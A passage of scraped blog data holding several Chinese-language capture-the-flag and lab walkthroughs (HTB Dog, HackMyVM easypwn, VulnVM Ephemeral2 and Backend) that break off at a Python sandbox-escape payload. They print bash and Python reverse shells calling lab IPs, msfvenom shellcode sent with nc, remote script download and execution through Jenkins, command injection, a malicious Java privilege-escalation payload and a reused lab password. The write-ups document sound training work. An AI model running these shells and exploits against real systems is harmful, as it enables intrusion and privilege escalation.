\u0026#39;mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop\u0026#39;;\r$database_prefix = \u0026#39;\u0026#39;;\r/**\r* Site configuration files location.\r* 登录tiffany的用户来到后台\ntiffany:BackDropJ2024DS2024 Own www-data #\r发现一个可以上传文件的页面\n进入到Manual installation\n这里只允许上传tar tgz gz bz2格式\n这里我是从官网上下载了一个模块\nModules for Backdrop CMS | Backdrop CMS 解压后修改这个地方\n然后重新打包成一个tar.gz\ntar -czvf bean.tar.gz * 上传成功\nEnable之后访问这个路径即可执行命令，得到www-data的shell\nOwn johncusack #\r进入mysql\n发现存在有jobert的密码hash，但是并不能爆破。\n尝试使用数据库的密码来登录johncusack成功\n[root@kali] /home/kali ❯ ssh johncusack@dog.htb #BackDropJ2024DS2024 Root #\r查看特殊命令\n-bash-5.0$ sudo -l\r[sudo] password for johncusack: Matching Defaults entries for johncusack on dog:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser johncusack may run the following commands on dog:\r(ALL : ALL) /usr/local/bin/bee 查看具体内容\n\u0026lt;?php\r/**\r* @file\r* A command line utility for Backdrop CMS.\r*/\r// Exit gracefully with a meaningful message if installed within a web\r// accessible location and accessed in the browser.\rif (!bee_is_cli()) {\recho bee_browser_load_html();\rdie();\r}\r// Set custom error handler.\rset_error_handler(\u0026#39;bee_error_handler\u0026#39;);\r// Include files.\rrequire_once __DIR__ . \u0026#39;/includes/miscellaneous.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/command.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/render.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/filesystem.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/input.inc\u0026#39;;\rrequire_once __DIR__ . \u0026#39;/includes/globals.inc\u0026#39;;\r// Main execution code.\rbee_initialize_server();\rbee_parse_input();\rbee_initialize_console();\rbee_process_command();\rbee_print_messages();\rbee_display_output();\rexit();\r/**\r* Custom error handler for `bee`.\r*\r* @param int $error_level\r* The level of the error.\r* @param string $message\r* Error message to output to the user.\r* @param string $filename\r* The file that the error came from.\r* @param int $line\r* The line number the error came from.\r* @param array $context\r* An array of all variables from where the error was triggered.\r*\r* @see https://www.php.net/manual/en/function.set-error-handler.php\r* @see _backdrop_error_handler()\r*/\rfunction bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {\rrequire_once __DIR__ . \u0026#39;/includes/errors.inc\u0026#39;;\r_bee_error_handler_real($error_level, $message, $filename, $line, $context);\r}\r/**\r* Detects whether the current script is running in a command-line environment.\r*/\rfunction bee_is_cli() {\rreturn (empty($_SERVER[\u0026#39;SERVER_SOFTWARE\u0026#39;]) \u0026amp;\u0026amp; (php_sapi_name() == \u0026#39;cli\u0026#39; || (is_numeric($_SERVER[\u0026#39;argc\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;argc\u0026#39;] \u0026gt; 0)));\r}\r/**\r* Return the HTML to display if this page is loaded in the browser.\r*\r* @return string\r* The concatentated html to display.\r*/\rfunction bee_browser_load_html() {\r// Set the title to use in h1 and title elements.\r$title = \u0026#34;Bee Gone!\u0026#34;;\r// Place a white block over \u0026#34;#!/usr/bin/env php\u0026#34; as this is output before\r// anything else.\r$browser_output = \u0026#34;\u0026lt;div style=\u0026#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;\u0026#39;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt;\u0026#34;;\r// Add the bee logo and style appropriately.\r$browser_output .= \u0026#34;\u0026lt;img src=\u0026#39;./images/bee.png\u0026#39; align=\u0026#39;right\u0026#39; width=\u0026#39;150\u0026#39; height=\u0026#39;157\u0026#39; style=\u0026#39;max-width:100%;margin-top:3rem;\u0026#39;\u0026gt;\u0026#34;;\r// Add meaningful text.\r$browser_output .= \u0026#34;\u0026lt;h1 style=\u0026#39;font-family:Tahoma;\u0026#39;\u0026gt;$title\u0026lt;/h1\u0026gt;\u0026#34;;\r$browser_output .= \u0026#34;\u0026lt;p style=\u0026#39;font-family:Verdana;\u0026#39;\u0026gt;Bee is a command line tool only and will not work in the browser.\u0026lt;/p\u0026gt;\u0026#34;;\r// Add the document title using javascript when the window loads.\r$browser_output .= \u0026#34;\u0026lt;script\u0026gt;window.onload = function(){document.title=\u0026#39;$title\u0026#39;;}\u0026lt;/script\u0026gt;\u0026#34;;\r// Output the combined string.\rreturn $browser_output;\r} 注意到这里存在一个eval方法\n这个工具必须要在**/var/www/html**中启动才行！\n然后开启bash就行了\nSummary #\rUser：/.git泄露拿到源码，遍历文件查找到了数据库的密码，以及一个tiffany用户。进入到后台可以上传一个module，这里我是直接到Modules for Backdrop CMS | Backdrop CMS中下载然后修改源码的，反弹shell拿到www-data的权限。\nRoot：bee是Backdrop CMS 的一个 命令行工具，需要在其主目录下使用。通过命令行执行php的system函数，获取到root的bash。\n","date":"2025-03-09","externalUrl":null,"permalink":"/posts/2025/03/htb-dog/","section":"Posts","summary":"","title":"HTB-Dog","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.105 -sV -A -Pn -T4 -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 14:36 CST\rNmap scan report for 192.168.56.105\rHost is up (0.00024s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Don\u0026#39;t Hack Me\r|_http-server-header: Apache/2.4.59 (Debian)\r6666/tcp open irc?\r| fingerprint-strings: | Help, Socks4, Socks5: | Hackers, get out of my machine\r| beast2: |_ start: 11\r|_irc-info: Unable to open connection 6666端口只能用nc连接，进入80端口发现需要扫描目录\nGobuster #\r[root@kali] /home/kali/easypwn ❯ gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.105\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 930]\r/.html (Status: 403) [Size: 279]\r/mysecret.txt (Status: 200) [Size: 383]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== /mysecret.txt\nGo to the most evil port.\rYou will get what you want.\rPlease be gentle with him, maybe he will be afraid.\rIn order to obtain its source code.\rPerhaps you will need the dictionary below.\r/YTlPX4d2UENbWnI.txt /YTlPX4d2UENbWnI.txt\nta0\rlingmj\rbamuwe\rtodd\rll104567\rprimary\rlvzhouhang\rqiaojojo\rflower Crack Zip #\r访问**/ll104567**得到一个压缩包\n但是解压需要密码，进行爆破\n[root@kali] /home/kali/easypwn ❯ zip2john ll104567 \u0026gt; zip.hash [root@kali] /home/kali/easypwn ❯ john zip.hash /usr/share/wordlists/rockyou.txt 得到一个二进制文件\nIDA #\r使用64位IDA进行反编译\n可以看到对输入有检测，如果是非法字节会报错Hackers，然后退出\n点击forbidden_bytes，查看过滤了哪些\n\\x00\\x20\\x0F\\xCD\\x09\\x22\\x0A 然后进入到下一步\n如果数据合法，程序通过 mmap64 将接收到的数据映射到内存中，并调用它（即执行这些数据）。如果映射失败，程序会输出错误并关闭连接。\n因此接下来生成shellcode发送，并且监听\n注意这里不要使用编码器👇\n[root@kali] /home/kali/easypwn/opt ❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f raw -b \u0026#39;\\x00\\x20\\x0F\\xCD\\x09\\x22\\x0A\u0026#39; -o shellcode_raw.bin 另起一个multi/handler，然后发送给端口即可\n[root@kali] /home/kali/easypwn/opt ❯ cat shellcode_raw.bin | nc 192.168.56.105 6666 Root #\r还是先把id_rsa.pub写入到**/home/lamb/.ssh/authorized_keys里面去，后面好ssh**登录操作\n读取tips.txt\nThere is a fun tool called cupp.\rI heard it\u0026#39;s a good social engineering dictionary generator.\rAre there really people that stupid these days? haha.\rThere is only one way to become ROOT, which is to execute getroot!!!\rAnd don\u0026#39;t forget, this is a PWN type machine.\r有一个很好玩的工具叫做 cupp.\r听说那是一个不错的社会工程学字典生成器.\r现在真的还会有人这么蠢吗？haha.\r成为 ROOT 的方法只有一条，就是执行 getroot !!!\r而且你不要忘记了，这是一个pwn类型的机器. 查看一下getroot的位置在哪里\n用nc把getroot传出来\n# msf\rnc 192.168.56.104 9999 \u0026lt; getroot\r# kali\r❯ nc -lvnp 9999 \u0026gt; getroot 同样进行反编译\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rdouble v3; // xmm0_8\r__int64 v4; // rax\r__int64 v5; // rax\r__int64 v6; // rdx\r__int64 v7; // rax\rint v8; // ebx\runsigned int v9; // eax\r__int64 v10; // rax\r__int64 v11; // rax\rchar v13[256]; // [rsp+10h] [rbp-260h] BYREF\r__int64 v14; // [rsp+110h] [rbp-160h] BYREF\rchar v15[32]; // [rsp+220h] [rbp-50h] BYREF\rint v16; // [rsp+240h] [rbp-30h] BYREF\rint v17; // [rsp+244h] [rbp-2Ch] BYREF\rint v18; // [rsp+248h] [rbp-28h] BYREF\rchar v19; // [rsp+24Fh] [rbp-21h] BYREF\rdouble v20; // [rsp+250h] [rbp-20h]\rint v21; // [rsp+258h] [rbp-18h]\rint v22; // [rsp+25Ch] [rbp-14h]\rif ( argc \u0026gt; 1 )\r{\rv22 = atoi(argv[1]);\rv9 = time(0LL);\rsrand(v9);\rv21 = rand() % 86400;\rgenerate_normal_distribution();\rv20 = v3;\rv16 = (int)(5.0 * v3) + v21;\rv17 = 86399;\rv10 = std::min\u0026lt;int\u0026gt;(\u0026amp;v16, \u0026amp;v17);\rv18 = 0;\rv16 = *(_DWORD *)std::max\u0026lt;int\u0026gt;(\u0026amp;v18, v10);\rstd::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v19);\rstd::string::basic_string(v15, \u0026#34;/root/cred\u0026#34;, \u0026amp;v19);\rstd::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v19);\rif ( v22 == v16 + 12345 )\r{\rstd::ifstream::basic_ifstream(v13, v15, 8LL);\rif ( (unsigned __int8)std::ios::operator bool(\u0026amp;v14) )\r{\rv11 = std::ifstream::rdbuf(v13);\rstd::ostream::operator\u0026lt;\u0026lt;(\u0026amp;std::cout, v11);\r}\rstd::ifstream::~ifstream(v13);\r}\rv8 = 0;\rstd::string::~string(v15);\r}\relse\r{\rv4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cerr, \u0026#34;Usage: \u0026#34;, envp);\rv5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v4, *argv, v4);\rv7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v5, \u0026#34; \u0026lt;magic_number\u0026gt;\u0026#34;, v6);\rstd::ostream::operator\u0026lt;\u0026lt;(v7, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;);\rreturn 1;\r}\rreturn v8;\r} 是随机数的种子设置问题，导致随机数可以预测\n利用思路：\n攻击者获取程序运行时间（精确到秒），生成相同随机序列计算**v16**。\n构造参数**argv[1]**为**v16 + 12345**，触发文件读取逻辑。\n可以写一个C语言程序来进行预测随机数\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026lt;math.h\u0026gt;\rdouble generate_normal_distribution(void) {\rdouble v0; // 用于存储对数值\rdouble v2; // 用于存储平方根值\rdouble v3; // 用于生成角度的随机数\rdouble x; // 用于生成对数值的随机数\rx = (double)rand() / 2147483647.0;\rv3 = (double)rand() / 2147483647.0;\rv0 = log(x);\rv2 = sqrt(-2.0 * v0);\rreturn cos(6.283185307179586 * v3) * v2;\r}\rint main() {\r// 设置随机数种子\rsrand(time(NULL));\r// 生成随机数\rint v21 = rand() % 86400; // 随机范围在 0 到 86399 之间\rdouble normal_value = generate_normal_distribution(); // 生成正态分布随机数\r// 计算 v16\rint v16 = (int)(5.0 * normal_value) + v21;\r// 限制 v16 在 0 到 86399 之间\rif (v16 \u0026lt; 0) {\rv16 = 0;\r} else if (v16 \u0026gt; 86399) {\rv16 = 86399;\r}\r// 输出 v16\rprintf(\u0026#34;%d\\n\u0026#34;, v16+12345);\rreturn 0;\r} 我这里是在目标靶机上编译的，使用gcc会报错，得用g++\n这里有个问题，读取**/root/cred仍然需要以root的身份，下面的我在本地测试的情况，也就是说仍然需要得到lamb**的密码\n在这个目录下发现一个留言\n下载CUPP密码生成器\nMebus/cupp: Common User Passwords Profiler (CUPP) 然后生成字典\n上传suForce进行密码爆破，得到密码\n读取**/root/cred**\n实际上这个哈希值并不需要解密，直接登录即可\nSummary #\rUser：下载到压缩包文件，进行爆破，得到二进制文件。反编译后查看源码，可以写入Shellcode进行反弹，写入密钥得到lamb用户。\nRoot：对getroot进行反编译，存在随机数预测漏洞，但需要以Root身份运行才能拿到cred。根据留言需要使用cupp生成密码字典，获得lamb的用户密码，最后成功提权。\n","date":"2025-03-07","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-easypwn/","section":"Posts","summary":"","title":"HackMyVm-easypwn","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Ephemeral2 ❯ nmap 192.168.56.107 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 0a:cc:f1:53:7e:6b:31:2c:10:1e:6d:bc:01:b1:c3:a2 (RSA)\r| 256 cd:19:04:a0:d1:8a:8b:3d:3e:17:ee:21:5d:cd:6e:49 (ECDSA)\r|_ 256 e5:6a:27:39:ed:a8:c9:03:46:f2:a5:8c:87:85:44:9e (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 08:00:27:47:B9:0F (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r|_nbstat: NetBIOS name: EPHEMERAL, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\r| smb2-time: | date: 2025-03-07T16:30:22\r|_ start_date: N/A\r|_clock-skew: 7h59m57s Gobuster #\r[root@kali] /home/kali/Ephemeral2 ❯ gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 ⏎\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.107\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/javascript (Status: 301) [Size: 321] [--\u0026gt; http://192.168.56.107/javascript/]\r/server-status (Status: 403) [Size: 279]\r/foodservice (Status: 301) [Size: 322] [--\u0026gt; http://192.168.56.107/foodservice/]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r=============================================================== 存在一个**/foodservice**页面\nEnumeration #\r[root@kali] /home/kali/Ephemeral2 ❯ enum4linux -a 192.168.56.107 有两个本地用户：randy和ralph\n尝试爆破randy的密码，这里使用的是msfconsole\n得到密码是pogiako\n在这里我尝试使用crackmapexec smb 进行身份验证，但是却失败了，为什么？难道是两个工具的差异，还是说SMB版本的问题？\n暂时留在这里，因为我搜索不到相关信息。\nOwn Randy #\r进入SYSADMIN目录，下载文件\n查看smb.conf配置\n[SYSADMIN]\rpath = /home/randy/SYSADMIN\rvalid users = randy\rbrowsable = yes\rwriteable = yes\rread only = no\rmagic script = smbscript.elf\rguest ok = no magic script = smbscript.elf\n这个选项指定了一个名为 smbscript.elf 的脚本文件，它将在访问共享时作为 \u0026ldquo;magic\u0026rdquo; 脚本运行。该脚本通常用于特定的自动化任务，如身份验证、权限控制等。\n因此可以上传一个恶意脚本进行反弹Shell\n[root@kali] /home/kali/Ephemeral2 ❯ cat smbscript.elf bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1\u0026#34; 将自己的id_rsa.pub写入到**/home/randy/.ssh/authorized_keys中，再SSH**登录\n在**/home/ralph中发现user.txt**但是无法读取！\nOwn ralph #\r查看定时任务发现ralph每分钟会执行一次ssh.sh脚本\nrandy@ephemeral:/tmp$ cat /home/ralph/tools/ssh.sh #!/bin/bash\r/usr/bin/ssh -o \u0026#34;StrictHostKeyChecking no\u0026#34; ralph@localhost -i /home/ralph/.ssh/id_rsa 而randy用户对以下文件具有可写权限\n/etc/profile.d/ 目录：该目录下的文件会在 用户登录时 被执行（包括 SSH 登录）。文件通常会配置一些环境变量、命令别名、终端外观等。\n因此可以写入反弹shell的语句\nrandy@ephemeral:/usr/bin$ cat /etc/profile.d/bash_completion.sh # shellcheck shell=sh disable=SC1091,SC2039,SC2166\r# Check for interactive bash and that we haven\u0026#39;t already been sourced.\rif [ \u0026#34;x${BASH_VERSION-}\u0026#34; != x -a \u0026#34;x${PS1-}\u0026#34; != x -a \u0026#34;x${BASH_COMPLETION_VERSINFO-}\u0026#34; = x ]; then\r# Check for recent enough version of bash.\rif [ \u0026#34;${BASH_VERSINFO[0]}\u0026#34; -gt 4 ] || \\\r[ \u0026#34;${BASH_VERSINFO[0]}\u0026#34; -eq 4 -a \u0026#34;${BASH_VERSINFO[1]}\u0026#34; -ge 1 ]; then\r[ -r \u0026#34;${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\\r. \u0026#34;${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion\u0026#34;\rif shopt -q progcomp \u0026amp;\u0026amp; [ -r /usr/share/bash-completion/bash_completion ]; then\r# Source completion code.\r. /usr/share/bash-completion/bash_completion\rfi\rfi\rfi\rbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1 得到反弹shell后同样写入公钥\nRoot #\r查看特殊命令\nralph@ephemeral:~$ sudo -l\rMatching Defaults entries for ralph on ephemeral:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser ralph may run the following commands on ephemeral:\r(root) NOPASSWD: /usr/bin/python3 /home/ralph/getfile.py 暂时无法直接查看getfile.py的内容\n似乎他是在POST传递一个东西\n尝试在输入参数的时候添加其他命令\nralph@ephemeral:~$ sudo /usr/bin/python3 /home/ralph/getfile.py File path: any IP address: any \u0026amp; /bin/bash -p 成功进入到root！\nSummary #\rUser：enum4linux扫描到存在randy用户，对其进行SMB爆破登录，读取smb配置文件可以上传一个魔术脚本，在登陆时会自动运行，因此得到randy的权限。查看定时任务得知，ralph每分钟会执行他的ssh脚本，同时randy可以修改**/etc/profile.d/下的ssh登陆后的配置文件，从而得到ralph**的权限。\nRoot：ralph有一个无法读取源码，似乎是传一个文件的脚本，通过对参数的注入，得到root权限。\n","date":"2025-03-07","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-ephermeral2/","section":"Posts","summary":"","title":"VulnVM-Ephermeral2","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Backend ❯ nmap 192.168.237.148 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 48:ec:8d:c2:a6:1e:52:43:62:44:29:36:58:73:15:6b (RSA)\r| 256 0d:39:f5:86:a1:fc:7d:ba:c6:55:14:37:2c:91:fe:37 (ECDSA)\r|_ 256 d6:91:b0:62:48:85:9c:51:dd:f9:20:35:d2:53:a6:25 (ED25519)\r8080/tcp open http Jetty 10.0.18\r|_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8).\r| http-robots.txt: 1 disallowed entry |_/\r|_http-server-header: Jetty(10.0.18)\rMAC Address: 00:0C:29:42:20:88 (VMware)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel CVE-2024-23897 #\r进入8080端口发现是一个Jenkins的登录页面\n经过测试，弱口令和SQL注入的情况并不存在\n搜索得到一个任意文件读取的漏洞\nJenkins Security Advisory 2024-01-24 在网上找了两个脚本\nxaitax/CVE-2024-23897: CVE-2024-23897 | Jenkins \u0026lt;= 2.441 \u0026amp; \u0026lt;= LTS 2.426.2 PoC and scanner.\nwjlin0/CVE-2024-23897: CVE-2024-23897 - Jenkins 任意文件读取 利用工具\n但是都只能读取到一行？？，我找找其他的方法\n可以访问**/jnlpJars/jenkins-cli.jar下载到jar包，根据vulnhub**里面的介绍，尝试读取一下登录密码\nvulhub/jenkins/CVE-2024-23897 at master · vulhub/vulhub admin:da1c139ad3ba437184b29528e6f24098 成功登录到后台，版本是2.441\nOwn jenkins #\r进入到命令执行的部分\n可以执行以下命令\nprintln \u0026#34;whoami\u0026#34;.execute().text\rprintln \u0026#34;cat /etc/passwd\u0026#34;.execute().text 尝试读取id_rsa密钥，发现没有\nprintln \u0026#34;ls -al /home/jenkins/.ssh/\u0026#34;.execute().text 但是可以把我们自己的密钥加到authorized_key中\n先做个反弹Shell吧，这里无法直接在控制台中反弹，需要上传一个脚本，可以参考👇\nJenkins未授权访问漏洞复现与 getshell 利用方法汇总_jenkins getshell-CSDN博客 #!/usr/bin/python\r# This is a Python reverse shell script\rimport socket,subprocess,os;\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\rs.connect((\u0026#34;192.168.237.147\u0026#34;,6666));\ros.dup2(s.fileno(),0);\ros.dup2(s.fileno(),1);\ros.dup2(s.fileno(),2);\rp=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); 然后上传执行\nprintln \u0026#34;wget http://192.168.237.147/revshell.py -P /tmp/\u0026#34;.execute().text\rprintln \u0026#34;python3 /tmp/revshell.py\u0026#34;.execute().text 成功得到反弹shell\n接下来是将我们的公钥添加到authorized_keys中\n然后成功使用SSH登录\nOwn tranquil #\r发现内部80端口开放了\n并且看到home里的另一个用户所属组是www-data\n先将端口转出来\n[root@kali] /home/kali/easypwn ❯ ssh -i ~/.ssh/id_rsa jenkins@192.168.237.148 -L 8888:127.0.0.1:80 然后访问**/uploadimages.php**，是一个命令执行的终端\n当前目录没有写的权限，反弹shell也失败，可以cat看看这个php的源码是什么\n可以看到使用了escapeshellcmd函数，以下这些都会被过滤\n\\ \u0026#39; \u0026#34; $ ; \u0026amp; | \u0026lt; \u0026gt;`。 因此只能尝试读取文件了\nls /home/tranquil/backup -al 刚好发现了私钥，因此可以直接使用来登录\nRoot #\r查看特殊命令\ntranquil@backend:~$ sudo -l\rMatching Defaults entries for tranquil on backend:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser tranquil may run the following commands on backend:\r(ALL) NOPASSWD: /usr/bin/java 准备一个恶意的java代码\nimport java.io.IOException;\rpublic class evil {\rpublic static void main(String[] args) throws IOException {\rRuntime.getRuntime().exec(\u0026#34;chmod u+s /bin/bash\u0026#34;);\r}\r} 然后打包成jar包\n然后执行即可拿到root权限\nSummary #\rUser：通过Jenkins的任意文件读取漏洞，获得默认的管理员密码。进入到后台的命令控制台，执行反弹Shell，写入公钥登录拿到jenkins用户的权限。将内网端口转发出来，发现存在一个读取文件的PHP文件，由于tranquil的目录配置问题，读取到他的私钥，从而获取到tranquil的权限。\nRoot：tranquil能以root的身份运行java命令，因此可以构造恶意java代码来提权。\n","date":"2025-03-05","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-backend/","section":"Posts","summary":"","title":"VulnVM-Backend","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r不知道为什么扫得很慢，这里就简略一点\n[root@kali] /home/kali/predictable ❯ nmap 172.17.0.2 -p- PORT STATE SERVICE\r22/tcp open ssh\r1111/tcp open lmsocialserver Crack Number #\r访问1111端口，在源代码中得到信息\n似乎是这个随机数列表的生成逻辑\nclass prng_lcg:\rm = c =\rn = 9223372036854775783\rdef __init__(self, seed=None):\rself.state = seed\rdef next(self):\rself.state = (self.state * self.m + self.c) % self.n\rreturn self.state\r...\r# return int\rdef obtener_semilla():\rreturn time.time_ns()\rdef obtener_semilla_anterior():\rreturn obtener_semilla() - 1\r...\rif \u0026#39;seed\u0026#39; not in session:\rsession[\u0026#39;seed\u0026#39;] = obtener_semilla()\rgen = prng_lcg(session[\u0026#39;seed\u0026#39;])\r...\rgen = prng_lcg(session[\u0026#39;seed\u0026#39;])\rsemilla_anterior = obtener_semilla_anterior()\r... 逆向破解线性同余生成器（LCG）的参数 m 和 c 是可行的，但需要一些已知的输出值来进行分析，我们已经有了99个参数，因此可以写一个脚本计算\nimport requests\rfrom bs4 import BeautifulSoup\rfrom collections import Counter\r# 正确定义LCG的模数\rMODULUS = 9223372036854775783\rdef extract_numbers(url):\rresponse = requests.get(url)\rsoup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;)\rsecond_td_numbers = []\rfor tr in soup.find_all(\u0026#39;tr\u0026#39;):\rtds = tr.find_all(\u0026#39;td\u0026#39;)\rif len(tds) \u0026gt; 1:\rsecond_td_numbers.append(int(tds[1].text))\rfiltered_numbers = [num for num in second_td_numbers if num \u0026gt; 100]\rreturn filtered_numbers\rdef find_lcg_parameters(random_numbers):\rif len(random_numbers) \u0026lt; 3:\rraise ValueError(\u0026#34;需要至少三个连续数字来推导参数\u0026#34;)\r# 计算相邻数字的差值\rdeltas = [\r(random_numbers[i] - random_numbers[i - 1]) % MODULUS\rfor i in range(1, len(random_numbers))\r]\rm_candidates = []\rfor i in range(1, len(random_numbers) - 1):\rtry:\r# 计算连续差值的关系\rt1 = deltas[i] # s_{i+1} - s_i\rt0 = deltas[i - 1] # s_i - s_{i-1}\r# 计算模逆元并推导m\rinv = mod_inverse(t0, MODULUS)\rm = (t1 * inv) % MODULUS\rm_candidates.append(m)\rexcept ValueError:\rcontinue # 跳过无法计算逆元的情况\rif not m_candidates:\rraise ValueError(\u0026#34;无法确定m值，可能需要更多数据\u0026#34;)\r# 统计找到最可能的m值\rm = Counter(m_candidates).most_common(1)[0][0]\r# 推导c值\rc = (random_numbers[1] - random_numbers[0] * m) % MODULUS\rreturn m, c\rdef extended_gcd(a, b):\rif a == 0:\rreturn (b, 0, 1)\rgcd, x1, y1 = extended_gcd(b % a, a)\rx = y1 - (b // a) * x1\ry = x1\rreturn (gcd, x, y)\rdef mod_inverse(a, m):\rgcd, x, y = extended_gcd(a, m)\rif gcd != 1:\rraise ValueError(\u0026#34;模逆元不存在\u0026#34;)\rreturn x % m\r# 执行程序\rif __name__ == \u0026#34;__main__\u0026#34;:\rtarget_url = \u0026#34;http://172.17.0.2:1111\u0026#34;\rnumbers = extract_numbers(target_url)\rtry:\rm, c = find_lcg_parameters(numbers)\rprint(f\u0026#34;成功破解参数: m={m}, c={c}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;错误: {str(e)}\u0026#34;) m=81853448938945944\rc=7382843889490547368 接下来就要预测第一百个参数，由于在源码中已经知道了next的生成逻辑，因此直接使用就好了\nprint( ( number_99 * m + c ) % n ) 成功得到凭证\nPyjail #\r这里我过滤了import、os等，可以使用**+号拼接字符串绕过，我在网上随便找了一个payload**\n[ x.__init__.__globals__ for x in \u0026#39;\u0026#39;.__class__.__base__.__subclasses__() if 